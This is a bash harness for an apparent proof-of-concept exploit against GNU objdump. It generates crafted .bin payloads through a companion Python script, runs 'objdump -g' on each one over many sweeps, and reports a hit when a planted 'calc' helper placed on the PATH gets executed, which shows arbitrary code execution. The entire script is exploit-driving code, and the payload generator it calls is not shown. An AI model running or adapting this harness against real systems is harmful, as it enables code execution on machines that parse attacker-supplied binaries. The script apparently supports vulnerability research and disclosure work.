#!/usr/bin/env bash
set -u

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT_DIR="${2:-$BASE_DIR/payloads}"
MAX_TRIES="${MAX_TRIES:-50}"

if [ "$#" -lt 1 ]; then
  echo "usage: $0 /path/to/objdump [payload-directory]" >&2
  exit 2
fi

OBJ="$1"

if [ ! -x "$OBJ" ]; then
  echo "objdump not executable: $OBJ" >&2
  exit 2
fi

if ! compgen -G "$OUT_DIR/*.bin" >/dev/null; then
  python3 "$BASE_DIR/generate_objdump_dlx_calc_poc.py" --out-dir "$OUT_DIR" >/dev/null
fi

cd "$BASE_DIR" || exit 2
export PATH="$BASE_DIR:$PATH"
rm -f "$BASE_DIR/calc_hit.log"

for try in $(seq 1 "$MAX_TRIES"); do
  for payload in "$OUT_DIR"/*.bin; do
    python3 -c 'import subprocess, sys
subprocess.run([sys.argv[1], "-g", sys.argv[2]], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)' "$OBJ" "$payload" >/dev/null 2>&1 || true
    if grep -q "CALC_HELPER_RAN" "$BASE_DIR/calc_hit.log" 2>/dev/null; then
      echo "HIT try=$try payload=$payload"
      exit 0
    fi
  done
done

echo "MISS after $MAX_TRIES sweeps" >&2
exit 1
